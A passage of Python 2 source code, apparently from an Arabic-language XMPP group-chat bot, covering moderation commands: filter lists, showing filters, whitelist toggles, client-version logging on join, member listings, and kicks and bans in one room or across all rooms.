            write_file(GBANJID_FILEX, str(GBANJID))
            reply(t, s, s[2]+' : '+XMSG9)
           else: reply(t, s, s[2]+' : '+XMSG10)		 
          else: reply(t, s, s[2]+' : '+XMSG1)   
         else: reply(t, s, s[2]+' : '+XMSG2)
        else: reply(t, s, s[2]+' : '+Xacl[30])    
       else: reply(t, s, s[2]+' : '+Xacl[29])                               
      except: reply(t, s, s[2]+' : '+XMSG5)
      return
     else: reply(t, s, s[2]+' : '+XMSG12)	
    if sp[0] ==Xacl[6] and sp[1] ==Xacl[24]:   
     if Wacc == "100": 	
      try:
       if ":" in p:
        if " *" in p:
         xp = sp[3]                                    
         if "فصل".decode('utf8') in p.split("* ",1)[1] or "طرد".decode('utf8') in p.split("* ",1)[1] or "حجب".decode('utf8') in p.split("* ",1)[1]:
          if "#" in p:                                                           
           if xp in Gsmart:
            del Gsmart[xp]                                                                            
            write_file(Gsmart_FILE, str(Gsmart))
            reply(t, s, s[2]+' : '+XMSG9)
           else: reply(t, s, s[2]+' : '+XMSG10)
          else: reply(t, s, s[2]+' : '+XMSG1)
         elif "قول".decode('utf-8') in p.split("* ",1)[1]:
          if "#" in p:                                                          
           if xp in Gmsgx:
            del Gmsgx[xp]                                                                            
            write_file(Gmsgx_FILE, str(Gmsgx))
            reply(t, s, s[2]+' : '+XMSG9)
           else: reply(t, s, s[2]+' : '+XMSG10)
          else: reply(t, s, s[2]+' : '+XMSG1)                                                                
         else: reply(t, s, s[2]+' : '+Xacl[33])                              
        else: reply(t, s, s[2]+' : '+Xacl[30])    
       else: reply(t, s, s[2]+' : '+Xacl[29])                               
      except: reply(t, s, s[2]+' : '+XMSG5)
     else: reply(t, s, s[2]+' : '+XMSG12)		  
    if sp[0] ==Xacl[6] and sp[1] ==Xacl[23]:    
     if Wacc == "100": 	
      try:
       if ":" in p:
        if " *" in p:
         xp = sp[3]                                
         if "فصل".decode('utf8') in p.split("* ",1)[1] or "طرد".decode('utf8') in p.split("* ",1)[1] or "حجب".decode('utf8') in p.split("* ",1)[1]:
          if "#" in p: 
           if xp in GBADNICK:
            del GBADNICK[xp]                                                                               
            write_file(GBADNICK_FILE, str(GBADNICK))
            reply(t, s, s[2]+' : '+XMSG9)
           else: reply(t, s, s[2]+' : '+XMSG10)		 
          else: reply(t, s, s[2]+' : '+XMSG1)   
         else: reply(t, s, s[2]+' : '+XMSG2)
        else: reply(t, s, s[2]+' : '+Xacl[30])    
       else: reply(t, s, s[2]+' : '+Xacl[29])                               
      except: reply(t, s, s[2]+' : '+XMSG5)
      return  
     else: reply(t, s, s[2]+' : '+XMSG12)		  
    if sp[0] ==Xacl[6] and sp[1] ==Xacl[22]:  
     if Wacc == "100": 	
      try:
       if ":" in p:
        if " *" in p:
         xp = sp[3]                                
         if "فصل".decode('utf8') in p.split("* ",1)[1] or "طرد".decode('utf8') in p.split("* ",1)[1] or "حجب".decode('utf8') in p.split("* ",1)[1]:
          if "#" in p: 
           if xp in GBANST:
            del GBANST[xp]                                                                               
            write_file(GSTATUSBAD, str(GBANST))
            reply(t, s, s[2]+' : '+XMSG9)
           else: reply(t, s, s[2]+' : '+XMSG10)		 
          else: reply(t, s, s[2]+' : '+XMSG1)   
         else: reply(t, s, s[2]+' : '+XMSG2)
        else: reply(t, s, s[2]+' : '+Xacl[30])    
       else: reply(t, s, s[2]+' : '+Xacl[29])                               
      except: reply(t, s, s[2]+' : '+XMSG5)
      return
     else: reply(t, s, s[2]+' : '+XMSG12)	  
    if sp[0] ==Xacl[6] and Xacl[17] not in p and Xacl[18] not in p and Xacl[19] not in p and Xacl[20] not in p and Xacl[21] not in p and Xacl[22] not in p and Xacl[23] not in p and Xacl[24] not in p and Xacl[25] not in p:  
     reply(t, s, s[2]+' : '+Xacl[69])                        	 
   except: reply(t, s, s[2]+' : '+Xacl[69])                       

   try:
    if Xacl[3] in p and Xacl[13] in p.split("show "):
     rep=''
     for x in smart[s[1]].keys():
      rep+="رسالة : "+x+' *  '
      for c in smart[s[1]][x].keys():
       rep+=c+" # "
       for i in smart[s[1]][x][c].keys():
        rep+=i+"\n"
     for x in msgx[s[1]].keys():
      rep+="رسالة : "+x+' *  '
      for c in msgx[s[1]][x].keys():
       rep+=c+" # "
       for i in msgx[s[1]][x][c].keys():
        rep+=i+"\n"                                                          
     if len(rep):		
      reply(t, s, s[2]+' : '+"\n"+rep)
     else: reply(t, s, s[2]+' : '+XMSG11)	
    if Xacl[3] in p and Xacl[8] in p.split("show "):
     rep=''
     for x in BANOS[s[1]].keys():
      rep+="نسخة : "+x+' *  '
      for c in BANOS[s[1]][x].keys():
       rep+=c+" # "
       for i in BANOS[s[1]][x][c].keys():
        rep+=i+"\n"
     if len(rep):		
      reply(t, s, s[2]+' : '+"\n"+rep)
     else: reply(t, s, s[2]+' : '+XMSG11)
    if Xacl[3] in p and Xacl_1[0] in p.split("show "):
     rep=''
     for x in BANOS_2[s[1]].keys():
      rep+="نسخة : "+x+' *  '
      for c in BANOS_2[s[1]][x].keys():
       rep+=c+" # "
       for i in BANOS_2[s[1]][x][c].keys():
        rep+=i+"\n"
     if len(rep):		
      reply(t, s, s[2]+' : '+"\n"+rep)
     else: reply(t, s, s[2]+' : '+XMSG11)	 
    if Xacl[3] in p and Xacl[16] in p.split("show "):
     rep=''
     for x in BADall[s[1]].keys():
      rep+="شاملة : "+x+' *  '
      for c in BADall[s[1]][x].keys():
       rep+=c+" # "
       for i in BADall[s[1]][x][c].keys():
        rep+=i+"\n"
     if len(rep):		
      reply(t, s, s[2]+' : '+"\n"+rep)
     else: reply(t, s, s[2]+' : '+XMSG11)     
    if Xacl[3] in p and Xacl[15] in p.split("show "):
     rep1=''
     for x in ROLEX[s[1]].keys():
      rep1+="رتبة : "+x+' *  '
      for c in ROLEX[s[1]][x].keys():
       if "فصل".decode('utf8') in c or "طرد".decode('utf8') in c:
        rep1+=c+" # "
       else:
        rep1+=c+" | "  
       for i in ROLEX[s[1]][x][c].keys():
        rep1+=i+"\n"   
     if len(rep1):		
      reply(t, s, s[2]+' : '+"\n"+rep1)
     else: reply(t, s, s[2]+' : '+XMSG11)	
                                
    if Xacl[3] in p and Xacl[9] in p.split("show "):
     rep=''
     for x in BANCAPS[s[1]].keys():
      rep+="كابس : "+x+' *  '
      for c in BANCAPS[s[1]][x].keys():
       rep+=c+" # "
       for i in BANCAPS[s[1]][x][c].keys():
        rep+=i+"\n"             
     if len(rep):		
      reply(t, s, s[2]+' : '+"\n"+rep)
     else: reply(t, s, s[2]+' : '+XMSG11)	
    if Xacl[3] in p and Xacl[7] in p.split("show "):
     rep=''
     for x in BANRES[s[1]].keys():
      rep+="ريسورس : "+x+' *  '
      for c in BANRES[s[1]][x].keys():
       rep+=c+" # "
       for i in BANRES[s[1]][x][c].keys():
        rep+=i+"\n"             
     if len(rep):		
      reply(t, s, s[2]+' : '+"\n"+rep)
     else: reply(t, s, s[2]+' : '+XMSG11)	
    if Xacl[3] in p and Xacl[10] in p.split("show "):
     rep=''
     for x in BANDO[s[1]].keys():
      rep+="سيرفر : "+x+' *  '
      for c in BANDO[s[1]][x].keys():
       rep+=c+" # "
       for i in BANDO[s[1]][x][c].keys():
        rep+=i+"\n"             
     if len(rep):		
      reply(t, s, s[2]+' : '+"\n"+rep)
     else: reply(t, s, s[2]+' : '+XMSG11)	
    if Xacl[3] in p and Xacl[11] in p.split("show "):
     rep=''
     for x in BANJID[s[1]].keys():
      rep+="حساب : "+x+' *  '
      for c in BANJID[s[1]][x].keys():
       rep+=c+" # "
       for i in BANJID[s[1]][x][c].keys():
        rep+=i+"\n"             
     if len(rep):		
      reply(t, s, s[2]+' : '+"\n"+rep)
     else: reply(t, s, s[2]+' : '+XMSG11)	
    if Xacl[3] in p and Xacl[12] in p.split("show "):
     rep=''
     for x in BANST[s[1]].keys():
      rep+="حالة : "+x+' *  '
      for c in BANST[s[1]][x].keys():
       rep+=c+" # "
       for i in BANST[s[1]][x][c].keys():
        rep+=i+"\n"             
     if len(rep):		
      reply(t, s, s[2]+' : '+"\n"+rep)
     else: reply(t, s, s[2]+' : '+XMSG11)	
    if Xacl[3] in p and Xacl[14] in p.split("show "):
     rep=''
     for x in BADNICK[s[1]].keys():
      rep+="لقب : "+x+' *  '
      for c in BADNICK[s[1]][x].keys():
       rep+=c+" # "
       for i in BADNICK[s[1]][x][c].keys():
        rep+=i+"\n"             
     if len(rep):		
      reply(t, s, s[2]+' : '+"\n"+rep)
     else: reply(t, s, s[2]+' : '+XMSG11)	
    if Xacl[3] in p and Xacl[16] not in p and Xacl[8] not in p and Xacl[7] not in p and Xacl[13] not in p and Xacl[10] not in p and Xacl[9] not in p and Xacl[11] not in p and Xacl[12] not in p and Xacl[14] not in p and Xacl[15] not in p and Xacl[4] not in p and Xacl_1[0] not in p:
     rep=''
     for x in smart[s[1]].keys():
      rep+="رسالة : "+x+' *  '
      for c in smart[s[1]][x].keys():
       rep+=c+" # "
       for i in smart[s[1]][x][c].keys():
        rep+=i+"\n"
     for x in msgx[s[1]].keys():
      rep+="رسالة : "+x+' *  '
      for c in msgx[s[1]][x].keys():
       rep+=c+" # "
       for i in msgx[s[1]][x][c].keys():
        rep+=i+"\n"                                                          
     for x in BANOS[s[1]].keys():
      rep+="نسخة : "+x+' *  '
      for c in BANOS[s[1]][x].keys():
       rep+=c+" # "
       for i in BANOS[s[1]][x][c].keys():
        rep+=i+"\n"   
     for x in BANOS_2[s[1]].keys():
      rep+="نسخة : "+x+' *  '
      for c in BANOS_2[s[1]][x].keys():
       rep+=c+" # "
       for i in BANOS_2[s[1]][x][c].keys():
        rep+=i+"\n"   		
     for x in BANCAPS[s[1]].keys():
      rep+="كابس : "+x+' *  '
      for c in BANCAPS[s[1]][x].keys():
       rep+=c+" #"
       for i in BANCAPS[s[1]][x][c].keys():
        rep+=i+"\n"             
     for x in BANRES[s[1]].keys():
      rep+="ريسورس : "+x+' *  '
      for c in BANRES[s[1]][x].keys():
       rep+=c+" # "
       for i in BANRES[s[1]][x][c].keys():
        rep+=i+"\n"             
     for x in BANDO[s[1]].keys():
      rep+="سيرفر : "+x+' *  '
      for c in BANDO[s[1]][x].keys():
       rep+=c+" # "
       for i in BANDO[s[1]][x][c].keys():
        rep+=i+"\n"             
     for x in BANJID[s[1]].keys():
      rep+="حساب : "+x+' *  '
      for c in BANJID[s[1]][x].keys():
       rep+=c+" # "
       for i in BANJID[s[1]][x][c].keys():
        rep+=i+"\n"             
     for x in BANST[s[1]].keys():
      rep+="حالة : "+x+' *  '
      for c in BANST[s[1]][x].keys():
       rep+=c+" # "
       for i in BANST[s[1]][x][c].keys():
        rep+=i+"\n"             
     for x in BADNICK[s[1]].keys():
      rep+="لقب : "+x+' *  '
      for c in BADNICK[s[1]][x].keys():
       rep+=c+" # "
       for i in BADNICK[s[1]][x][c].keys():
        rep+=i+"\n"
     for x in BADall[s[1]].keys():
      rep+="شاملة : "+x+' *  '
      for c in BADall[s[1]][x].keys():
       rep+=c+" # "
       for i in BADall[s[1]][x][c].keys():
        rep+=i+"\n"        
     for x in ROLEX[s[1]].keys():
      rep+="رتبة : "+x+' *  '
      for c in ROLEX[s[1]][x].keys():
       if "فصل".decode('utf8') in c or "طرد".decode('utf8') in c:
        rep+=c+" # "
       else:
        rep+=c+" | "  
       for i in ROLEX[s[1]][x][c].keys():
        rep+=i+"\n"                                                          
     if len(rep):		
      reply(t, s, s[2]+' : '+"\n"+rep)
     else: reply(t, s, s[2]+' : '+XMSG11)	 
    if Xacl[4] in p and Xacl[16] not in p and Xacl[8] not in p and Xacl[7] not in p and Xacl[13] not in p and Xacl[10] not in p and Xacl[9] not in p and Xacl[11] not in p and Xacl[12] not in p and Xacl[14] not in p:
     if Wacc == "100":	
      rep=''
      for x in Gsmart:
       rep+="رسالة-عامة : "+x+' *  '
       for c in Gsmart[x].keys():
        rep+=c+" # "
        for i in Gsmart[x][c].keys():
         rep+=i+"\n"
      for x in Gmsgx:
       rep+="رسالة-عامة : "+x+' *  '
       for c in Gmsgx[x].keys():
        rep+=c+" # "
        for i in Gmsgx[x][c].keys():
         rep+=i+"\n"                                                          
      for x in GBANOS:
       rep+="نسخة-عامة : "+x+' *  '
       for c in GBANOS[x].keys():
        rep+=c+" # "
        for i in GBANOS[x][c].keys():
         rep+=i+"\n"
      for x in GBADall:
       rep+="شاملة-عامة : "+x+' *  '
       for c in GBADall[x].keys():
        rep+=c+" # "
        for i in GBADall[x][c].keys():
         rep+=i+"\n"          
      for x in GBANCAPS:
       rep+="كابس-عام : "+x+' *  '
       for c in GBANCAPS[x].keys():
        rep+=c+" # "
        for i in GBANCAPS[x][c].keys():
         rep+=i+"\n"             
      for x in GBANRES:
       rep+="ريسورس-عام : "+x+' *  '
       for c in GBANRES[x].keys():
        rep+=c+" # "
        for i in GBANRES[x][c].keys():
         rep+=i+"\n"             
      for x in GBANDO:
       rep+="سيرفر-عام : "+x+' *  '
       for c in GBANDO[x].keys():
        rep+=c+" # "
        for i in GBANDO[x][c].keys():
         rep+=i+"\n"             
      for x in GBANJID:
       rep+="حساب-عام : "+x+' *  '
       for c in GBANJID[x].keys():
        rep+=c+" # "
        for i in GBANJID[x][c].keys():
         rep+=i+"\n"             
      for x in GBANST:
       rep+="حالة-عامة : "+x+' *  '
       for c in GBANST[x].keys():
        rep+=c+" # "
        for i in GBANST[x][c].keys():
         rep+=i+"\n"             
      for x in GBADNICK:
       rep+="لقب-عام : "+x+' *  '
       for c in GBADNICK[x].keys():
        rep+=c+" # "
        for i in GBADNICK[x][c].keys():
         rep+=i+"\n"                                                        
      if len(rep):		
       reply(t, s, s[2]+' : '+"\n"+rep)
      else: reply(t, s, s[2]+' : '+XMSG11)	
     else: reply(t, s, s[2]+' : '+XMSG12)	  
    if Xacl[4] in p and Xacl[24] in p.split("show_global "):
     if Wacc == "100":	
      rep=''
      for x in Gsmart:
       rep+="رسالة-عامة : "+x+' *  '
       for c in Gsmart[x].keys():
        rep+=c+" # "
        for i in Gsmart[x][c].keys():
         rep+=i+"\n"
      for x in Gmsgx:
       rep+="رسالة-عامة : "+x+' *  '
       for c in Gmsgx[x].keys():
        rep+=c+" # "
        for i in Gmsgx[x][c].keys():
         rep+=i+"\n"                                                          
      if len(rep):		
       reply(t, s, s[2]+' : '+"\n"+rep)
      else: reply(t, s, s[2]+' : '+XMSG11)	
     else: reply(t, s, s[2]+' : '+XMSG12)	  
    if Xacl[4] in p and Xacl[17] in p.split("show_global "):
     if Wacc == "100":	
      rep=''
      for x in GBANOS:
       rep+="نسخة-عامة : "+x+' *  '
       for c in GBANOS[x].keys():
        rep+=c+" # "
        for i in GBANOS[x][c].keys():
         rep+=i+"\n"    
      if len(rep):		
       reply(t, s, s[2]+' : '+"\n"+rep)
      else: reply(t, s, s[2]+' : '+XMSG11)	
     else: reply(t, s, s[2]+' : '+XMSG12)	  
    if Xacl[4] in p and Xacl[20] in p.split("show_global "):
     if Wacc == "100":	
      rep=''
      for x in GBANCAPS:
       rep+="كابس-عام : "+x+' *  '
       for c in GBANCAPS[x].keys():
        rep+=c+" # "
        for i in GBANCAPS[x][c].keys():
         rep+=i+"\n"              
      if len(rep):		
       reply(t, s, s[2]+' : '+"\n"+rep)
      else: reply(t, s, s[2]+' : '+XMSG11)
     else: reply(t, s, s[2]+' : '+XMSG12)
    if Xacl[4] in p and Xacl[25] in p.split("show_global "):
     if Wacc == "100":	
      rep=''
      for x in GBADall:
       rep+="شاملة-عامة : "+x+' *  '
       for c in GBADall[x].keys():
        rep+=c+" # "
        for i in GBADall[x][c].keys():
         rep+=i+"\n"              
      if len(rep):		
       reply(t, s, s[2]+' : '+"\n"+rep)
      else: reply(t, s, s[2]+' : '+XMSG11)
     else: reply(t, s, s[2]+' : '+XMSG12)     
    if Xacl[4] in p and Xacl[18] in p.split("show_global "):
     if Wacc == "100":	
      rep=''
      for x in GBANRES:
       rep+="ريسورس-عام : "+x+' *  '
       for c in GBANRES[x].keys():
        rep+=c+" # "
        for i in GBANRES[x][c].keys():
         rep+=i+"\n"             
      if len(rep):		
       reply(t, s, s[2]+' : '+"\n"+rep)
      else: reply(t, s, s[2]+' : '+XMSG11)	
     else: reply(t, s, s[2]+' : '+XMSG12)	  
    if Xacl[4] in p and Xacl[19] in p.split("show_global "):
     if Wacc == "100":	
      rep=''
      for x in GBANDO:
       rep+="سيرفر-عام : "+x+' *  '
       for c in GBANDO[x].keys():
        rep+=c+" # "
        for i in GBANDO[x][c].keys():
         rep+=i+"\n"             
      if len(rep):		
       reply(t, s, s[2]+' : '+"\n"+rep)
      else: reply(t, s, s[2]+' : '+XMSG11)	
     else: reply(t, s, s[2]+' : '+XMSG12)	  
    if Xacl[4] in p and Xacl[21] in p.split("show_global "):
     if Wacc == "100":	
      rep=''
      for x in GBANJID:
       rep+="حساب-عام : "+x+' *  '
       for c in GBANJID[x].keys():
        rep+=c+" # "
        for i in GBANJID[x][c].keys():
         rep+=i+"\n"              
      if len(rep):		
       reply(t, s, s[2]+' : '+"\n"+rep)
      else: reply(t, s, s[2]+' : '+XMSG11)	
     else: reply(t, s, s[2]+' : '+XMSG12)	  
    if Xacl[4] in p and Xacl[22] in p.split("show_global "):
     if Wacc == "100":	
      rep=''
      for x in GBANST:
       rep+="حالة-عامة : "+x+' *  '
       for c in GBANST[x].keys():
        rep+=c+" # "
        for i in GBANST[x][c].keys():
         rep+=i+"\n"            
      if len(rep):		
       reply(t, s, s[2]+' : '+"\n"+rep)
      else: reply(t, s, s[2]+' : '+XMSG11)	
     else: reply(t, s, s[2]+' : '+XMSG12)	  
    if Xacl[4] in p and Xacl[23] in p.split("show_global "):
     if Wacc == "100":	
      rep=''
      for x in GBADNICK:
       rep+="لقب-عام : "+x+' *  '
       for c in GBADNICK[x].keys():
        rep+=c+" # "
        for i in GBADNICK[x][c].keys():
         rep+=i+"\n"              
      if len(rep):		
       reply(t, s, s[2]+' : '+"\n"+rep)
      else: reply(t, s, s[2]+' : '+XMSG11)	
     else: reply(t, s, s[2]+' : '+XMSG12)	  
   except: reply(t, s, s[2]+' : '+Xacl[76])
   
   
register(add_acl, Xacl[0], 30)
##ACl
######################################################
######################################################

def banos_join_melody11(type, source, parameters,inmuc1):
  packet = IQ(CLIENTS[source[3]], 'get')
  q = packet.addElement('query', 'jabber:iq:version')
  packet.addCallback(version_result_banos_melody, source[1], inmuc1  , source[3])
  reactor.callFromThread(packet.send, source[1]+'/'+inmuc1  )  
  if inmuc1 in BADall[source[1]].keys():
    filter_melody14(source, inmuc1, 'role', 'none')
  if inmuc1 in GBADall:
    filter_melody14(source, inmuc1, 'role', 'none')	
def filter_melody14(s, reason, moder,order):
    jid = get_true_jid(s)
    packet = IQ(CLIENTS[s[3]], 'set')
    query = packet.addElement('query', 'http://jabber.org/protocol/muc#admin')
    i = query.addElement('item')
    i['nick'] = reason
    i[moder] = order
    i.addElement('reason').addContent(' ')
    reactor.callFromThread(packet.send, s[1]) 
def room_access(cljid, g, user):

        jid_nick = 'jid'
        rol_affl = 'affiliation'
        set_to = 'outcast'
        packet = IQ(CLIENTS[cljid], 'set')
        query = packet.addElement('query', 'http://jabber.org/protocol/muc#admin')
        i = query.addElement('item')
        i[jid_nick] = user
        i[rol_affl] = set_to
        i.addElement('reason').addContent(XFiltMSG[67])
        reactor.callFromThread(packet.send, g)


#######################################

def users_1(g, n, r, afl, cljid):
 if not g in White or not White[g].keys():
  return
 if "on" in White[g].keys():
  file='rooms-data/'+g+'/users.py'
  if check_file(g,'users.py'):
   try:
    uslog = eval(read_file(file))
   except: write_file(file, "{}", 0) 
  else: print 'Error create or read users file'
  jid = get_true_jidd(g+'/'+n)
  if jid not in uslog:  
   uslog[jid] = {}
   write_file(file, str(uslog))	

register_join_handler(users_1)    

def add_White(t, s, p):
        if not s[1] in GROUPCHATS:
                return
        if not s[1] in White:
                White[s[1]]={}
        if p not in ["تفعيل".decode('utf8'),"تعطيل".decode('utf8')]:
                reply(t, s, s[2]+' : '+XWhite[0])	
        if p == "تفعيل".decode('utf8') and "تفعيل".decode('utf8') in White[s[1]].keys():	    
                reply(t, s, s[2]+' : '+XWhite[1])					
        if p == "تفعيل".decode('utf8') and "تفعيل".decode('utf8') not in White[s[1]].keys():	
                White[s[1]]["تفعيل".decode('utf8')]={}
                reply(t, s, s[2]+' : '+XWhite[2])
                write_file(White_FILE, str(White))   	
        if p == "تعطيل".decode('utf8') and "تفعيل".decode('utf8') not in White[s[1]].keys():
                reply(t, s, s[2]+' : '+XWhite[3])	
        if p == "تعطيل".decode('utf8') and "تفعيل".decode('utf8') in White[s[1]].keys():					
                del White[s[1]]		
                reply(t, s, s[2]+' : '+XWhite[4])
                write_file(White_FILE, str(White))	
def remove_White(t, s, p):
        if not s[1] in GROUPCHATS:
                return
        if not s[1] in Black1:
                Black1[s[1]]={}
        if p not in ["تفعيل".decode('utf8'),"تعطيل".decode('utf8')]:
                reply(t, s, s[2]+' : '+XWhite[5])
        if p == "تفعيل".decode('utf8') and "تفعيل".decode('utf8') in Black1[s[1]].keys():	    
                reply(t, s, s[2]+' : '+XWhite[6])					
        if p == "تفعيل".decode('utf8') and "تفعيل".decode('utf8') not in Black1[s[1]].keys():	
                Black1[s[1]]["تفعيل".decode('utf8')]={}
                reply(t, s, s[2]+' : '+XWhite[7])
                write_file(Black1_FILE, str(Black1))   	
        if p == "تعطيل".decode('utf8') and "تفعيل".decode('utf8') not in Black1[s[1]].keys():
                reply(t, s, s[2]+' : '+XWhite[8])	
        if p == "تعطيل".decode('utf8') and "تفعيل".decode('utf8') in Black1[s[1]].keys():					
                del Black1[s[1]]	
                reply(t, s, s[2]+' : '+XWhite[9])
                write_file(Black1_FILE, str(Black1))
					
register(add_White, XFilter[53], 30)
register(remove_White, XFilter[54], 30)
#القايمة البيضاء
######################################################
######################################################
#############
def VERSHOWR_join(g, n, r, afl, cljid):
        global VERSHOWR
        global VERSHOW_LIMIT
        if not g in VERSHOWR:
                VERSHOWR[g]={}
        if n == get_bot_nick(g):
                return
        if not g in VERSHOW_LIMIT.keys():
                VERSHOW_LIMIT[g]={'t':time.time(),'n':1}
        else:
                if time.time() - VERSHOW_LIMIT[g]['t']<3:
                        VERSHOW_LIMIT[g]['n']+=1
                        VERSHOW_LIMIT[g]['t']= time.time()
                        if VERSHOW_LIMIT[g]['n']>3:
                                return
                else:
                        VERSHOW_LIMIT[g]['t'] = time.time()
                        VERSHOW_LIMIT[g]['n'] = 1
        packet = IQ(CLIENTS[cljid], 'get')
        q = packet.addElement('query', 'jabber:iq:version')
        packet.addCallback(version_result_VERSHOWR, g, n, cljid)
        reactor.callFromThread(packet.send, g+'/'+n)

def version_result_VERSHOWR(g, n, cljid, x):
        file='rooms-data/'+g+'/Details.py'
        if check_file(g,'Details.py'):
                        try:
                                uslog = eval(read_file(file))
                        except: write_file(file, "{}", 0)                      
        try:
                if x['type'] == 'error':
                    pass
                else:
                    query = element2dict(x)['query']
                    r = element2dict(query)
                    name = str(r.get('name').children[0])
                    os = r.get('os').children[0]		
                    if "on" in VERSHOWR[g].keys():
                     if	not get_true_jidd(g+'/'+n) in uslog:				
                        msg(cljid, g, n + u":" + Xvershow[6] + name + " \\\ " + Xvershow[7] + os)
        except: pass             
			
        jid = get_true_jidd(g+'/'+n)
        nick = n
        if "no" not in DeTails:
                if not jid in uslog:
                        uslog[jid] = {}
                try:
                        if not os in uslog[jid]:
                                uslog[jid][os] = {}
                except: uslog[jid]["None."] = {}
                try:
                        if not n in uslog[jid][os]:
                                uslog[jid][os][n] = {}
                except: uslog[jid]["None."][n] = {}
		
                write_file(file, str(uslog))           

def add_VERSHOWR(t, s, p):
        if not s[1] in GROUPCHATS:
                return
        if not s[1] in VERSHOWR:
                VERSHOWR[s[1]]={}
        if not "on" in VERSHOWR[s[1]].keys():
                VERSHOWR[s[1]]["on"]={}
                reply(t, s, s[2]+' : '+Xvershow[2])
                write_file(VERSHOWR_FILE, str(VERSHOWR))
                load_VERSHOWR()
        else:				
                reply(t, s, s[2]+' : '+Xvershow[4])						
def remove_VERSHOWR(t, s, p):
        if not s[1] in GROUPCHATS:
                return
        if not s[1] in VERSHOWR:
                VERSHOWR[s[1]]={}
        if "on" in VERSHOWR[s[1]].keys():
                        del VERSHOWR[s[1]]["on"]
                        reply(t, s, s[2]+' : '+Xvershow[3])
                        write_file(VERSHOWR_FILE, str(VERSHOWR))
                        load_VERSHOWR()
        else:				
                reply(t, s, s[2]+' : '+Xvershow[5])				

def load_VERSHOWR():
        try:
                fp1 = file("plugins/BAN.py")
                exec fp1 in globals()
                fp1.close()
        except:
                raise
register_join_handler(VERSHOWR_join)						
register(add_VERSHOWR, Xvershow[0], 30)
register(remove_VERSHOWR, Xvershow[1], 30)
#اظهار النسخ
######################################################
######################################################
# كان هنا

def MUC_NEW1(t, s, p):
 if not p:	
   vis=[]
   non=[]   
   mem=[]   
   adm=[]  
   own=[]  
   foll=[]   
   for x in GROUPCHATS[s[1]].keys():
    afl=GROUPCHATS[s[1]][x]['afl']  
    role=GROUPCHATS[s[1]][x]['role'] 	
   muc=[]
   for x in GROUPCHATS[s[1]].keys():
    afl=GROUPCHATS[s[1]][x]['afl']     
    if afl=="owner" or afl=="admin" or "member" or "none" or "visitor":
     muc.append(x)
   if len(muc):	 
    msg(s[3],s[1], "\n هؤلاء الاشخاص كانوا متواجدين خلال 12 ساعة مضت : : \n | %s |"%(' | '.join(muc))) 	
   else: msg(s[3],s[1], X_MUC[7]) 	
   return 


def MUC_NEW(prs, cljid):

  try:
    jid = prs['from'].split('/')
    groupchat = jid[0]
    nick = prs['from'][len(groupchat)+1:]
    try:
                _x = [i for i in prs.children if (i.name=='x') and (i.uri == 'http://jabber.org/protocol/muc#user')][0]
                _item = [i for i in _x.children if i.name=='item'][0]
                try: afl = _item['affiliation']
                except: pass
                try: role = _item['role']
                except: pass
    except: pass	
    if groupchat in GROUPCHATS and nick in GROUPCHATS[groupchat]:
                GROUPCHATS[groupchat][nick]['role']=role     
                GROUPCHATS[groupchat][nick]['afl']=afl   				
  except: pass	                
register_presence_handler(MUC_NEW)
register(MUC_NEW1, X_MUC[0], 20)

######################################################
######################################################
# هنا
def handler_total_in_muc(type, source, parameters):
	groupchat=source[1]
	if GROUPCHATS.has_key(groupchat):
		inmuc=[]
		for x in GROUPCHATS[groupchat].keys():
			if GROUPCHATS[groupchat][x]['ishere']==1:
				inmuc.append(x)
		reply(type, source, u' \n اجمالي عدد المتواجدين بالروم الآن هو : '+str(len(inmuc))+u'\n اسماء الاشخاص المتواجدين بالروم الآن هي :\n'+u' \n '.join(inmuc))
	else:
		reply(type, source, u'*PARDON*')
		
		
register(handler_total_in_muc, X_MUC2[0], 20)

######################################################
######################################################
def Global(type, source, parameters):
        file = 'rooms-data/chatroom.py'
        db = eval(read_file(file))
        if not GROUPCHATS or not parameters:
                return
        if not db:
                return
        if parameters.count('@'):
                        jid = parameters
                        reply(type, source, source[2]+' : '+Xadmin[10])
        else:
                        jid = get_true_jid(source[1]+'/'+parameters.count('@'))
                        print(jid)
        for x in GROUPCHATS:
                ban1(source[3], x, Xadmin[12]+source[2], jid)
			
def ban1(cljid, groupchat, reason, par_two):
        jid_nick = "jid"
        aff_role = "affiliation"
        mode = "outcast"
        q = domish.Element(('jabber:client', 'iq'))
        q['type'] = 'set'
        q['id'] = str(random.randrange(1,999))
        q['to'] = groupchat
        query = q.addElement('query', 'http://jabber.org/protocol/muc#admin')
        i = query.addElement('item')
        i[aff_role] = mode
        i[jid_nick] = par_two
        i.addElement('reason').addContent(reason)
        reactor.callFromThread(dd, q, CLIENTS[cljid])
def rrr(cljid, groupchat, reason, par_two):
        jid_nick = "nick"
        aff_role = "role"
        mode = "participant"
        q = domish.Element(('jabber:client', 'iq'))
        q['type'] = 'set'
        q['id'] = str(random.randrange(1,999))
        q['to'] = groupchat
        query = q.addElement('query', 'http://jabber.org/protocol/muc#admin')
        i = query.addElement('item')
        i[aff_role] = mode
        i[jid_nick] = par_two
        i.addElement('reason').addContent(reason)
        reactor.callFromThread(dd, q, CLIENTS[cljid])		
def kick1(cljid, groupchat, reason, par_two):
        jid_nick = "nick"
        aff_role = "role"
        mode = "none"
        q = domish.Element(('jabber:client', 'iq'))
        q['type'] = 'set'
        q['id'] = str(random.randrange(1,999))
        q['to'] = groupchat
        query = q.addElement('query', 'http://jabber.org/protocol/muc#admin')
        i = query.addElement('item')
        i[aff_role] = mode
        i[jid_nick] = par_two
        i.addElement('reason').addContent(reason)
        reactor.callFromThread(dd, q, CLIENTS[cljid])
			
register(Global, Xadmin[12], 100)


######################################################
######################################################

def Globa2(type, source, parameters):
        file = 'rooms-data/chatroom.py'
        db = eval(read_file(file))
        if not GROUPCHATS or not parameters:
                return
        if not db:
                return
        if parameters.count('@'):
                        jid = parameters
                        reply(type, source, source[2]+' : '+Xadmin[10])
        else:
                        jid = get_true_jid(source[1]+'/'+parameters.count('@'))
                        print(jid)
        for x in GROUPCHATS:
                ban2(source[3], x, Xadmin[12]+source[2], jid)
			
def ban2(cljid, groupchat, reason, par_two):
        jid_nick = "jid"
        aff_role = "affiliation"
        mode = "none"
        q = domish.Element(('jabber:client', 'iq'))
        q['type'] = 'set'
        q['id'] = str(random.randrange(1,999))
        q['to'] = groupchat
        query = q.addElement('query', 'http://jabber.org/protocol/muc#admin')
        i = query.addElement('item')
        i[aff_role] = mode
        i[jid_nick] = par_two
        i.addElement('reason').addContent(reason)
        reactor.callFromThread(dd, q, CLIENTS[cljid])


	
register(Globa2, Xadmin[13], 100)
register(Globa2, Xadmin[14], 100)

######################################################
######################################################
# -*- coding: utf-8 -*-

def hnd_port_tel(t, s, p):
    if not p or not p.count(' '):
